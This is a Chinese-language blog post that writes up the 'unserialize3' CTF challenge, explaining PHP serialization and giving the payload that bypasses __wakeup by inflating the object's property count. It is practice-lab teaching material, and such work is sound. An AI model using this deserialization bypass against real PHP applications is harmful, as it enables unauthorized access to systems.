---
layout:     post               # 使用的布局（不需要改）
title:      unserialize3    # 标题 
subtitle:    攻防世界   #副标题
date:       2020-07-13         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - CTF
  
---

```
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```

看着情况是让输入一个`code`参数呀。

还有这道题的题目是`unserialize3`,

很不容易让人不浮想联翩啊。。。

猜测`code`参数应该传入一个序列化后的字符串，后台会进行反序列化，

但是反序列化操作时，会触发`__wake()`方法，但可以改变对象属性值个数进行绕过呀。

```
<?php
class xctf{
	public $flag = '111';
	public function __wakeup(){
	exit('bad requests');
	}
}
$obj = new xctf();

$str = serialize($obj);

echo $str;
```

生成`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`

解释一下吧，序列化是为了将对象转换为字符串存储。(因为无法直接存储对象)。

各参数代表的含义：

```
O代表是一个对象:
4代表xctf类型的字符个数:
xctf代表类型:
{就是一个格式
s代表是字符串:
4代表flag属性的字符个数:
flag代表对象的属性;
s依旧代表字符串:
3代表flag属性值111的字符个数:
111代表flag属性的属性值;
} 固定格式
```

`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`改为`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`,绕过。

![UtA7bn.png](https://s1.ax1x.com/2020/07/13/UtA7bn.png)